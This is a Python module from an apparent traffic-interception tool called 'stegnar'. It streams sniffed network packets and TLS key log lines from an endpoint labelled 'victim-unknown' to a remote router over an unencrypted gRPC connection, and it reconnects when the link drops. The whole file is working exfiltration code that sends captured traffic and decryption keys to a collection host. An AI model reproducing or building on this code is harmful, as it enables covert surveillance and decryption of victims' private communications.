"""
grpc_client.py — Unidirectional gRPC stream client to the Routing System.

Opens a persistent HTTP/2 connection and streams PayloadChunk messages
from the local packet + key queues. Handles reconnection on failure.

Flow:
  - Reads CapturedPacket objects from pkt_queue
  - Reads SSL key lines from key_queue  (drained into a buffer per chunk)
  - Builds a PayloadChunk proto message
  - Streams it to the Router's StreamPayload RPC
"""

import asyncio
import logging
import os
import time

import grpc
import grpc.experimental.aio as aio

import sys
sys.path.insert(0, "/app/proto")

import stegnar_pb2 as pb
import stegnar_pb2_grpc as pb_grpc

from sniffer import CapturedPacket

logger = logging.getLogger("stegnar.grpc_client")

ROUTER_ADDR    = os.environ.get("ROUTER_GRPC_ADDR", "routing:50051")
ENDPOINT_ID    = os.environ.get("ENDPOINT_ID",       "victim-unknown")
RECONNECT_WAIT = 5   # seconds before reconnect attempt
BATCH_TIMEOUT  = 0.05  # seconds to drain key_queue into each chunk


async def stream_to_router(
    pkt_queue: asyncio.Queue,
    key_queue: asyncio.Queue,
    stop_event: asyncio.Event,
):
    """
    Main loop: connects to router, streams payloads, reconnects on error.
    """
    while not stop_event.is_set():
        try:
            await _stream_session(pkt_queue, key_queue, stop_event)
        except grpc.aio.AioRpcError as e:
            logger.warning("gRPC stream error: %s — reconnecting in %ds", e, RECONNECT_WAIT)
        except Exception as e:
            logger.error("Unexpected error in stream session: %s", e, exc_info=True)

        if not stop_event.is_set():
            await asyncio.sleep(RECONNECT_WAIT)


async def _stream_session(
    pkt_queue: asyncio.Queue,
    key_queue: asyncio.Queue,
    stop_event: asyncio.Event,
):
    """Single gRPC session: opens channel, streams until disconnected or stopped."""
    logger.info("Connecting to router at %s ...", ROUTER_ADDR)
    async with aio.insecure_channel(ROUTER_ADDR) as channel:
        stub = pb_grpc.RouterServiceStub(channel)

        async def _chunk_generator():
            while not stop_event.is_set():
                # Wait for next captured packet
                try:
                    pkt: CapturedPacket = await asyncio.wait_for(
                        pkt_queue.get(), timeout=1.0
                    )
                except asyncio.TimeoutError:
                    continue

                # Drain any available SSL key lines (non-blocking)
                ssl_lines = []
                try:
                    while True:
                        line = key_queue.get_nowait()
                        ssl_lines.append(line)
                except asyncio.QueueEmpty:
                    pass

                chunk = pb.PayloadChunk(
                    endpoint_id = ENDPOINT_ID,
                    stream_id   = f"{pkt.src_ip}:{pkt.src_port}-{pkt.dst_ip}:{pkt.dst_port}",
                    raw_bytes   = pkt.raw_bytes,
                    sha256      = pkt.sha256,
                    ssl_keylog  = "\n".join(ssl_lines),
                    src_ip      = pkt.src_ip,
                    dst_ip      = pkt.dst_ip,
                    src_port    = pkt.src_port,
                    dst_port    = pkt.dst_port,
                    captured_at = pkt.captured_at,
                )
                yield chunk

        logger.info("gRPC stream open to router.")
        ack: pb.StreamAck = await stub.StreamPayload(_chunk_generator())
        logger.info(
            "Stream closed by router: ok=%s chunks_recv=%d msg=%s",
            ack.ok, ack.chunks_recv, ack.message
        )
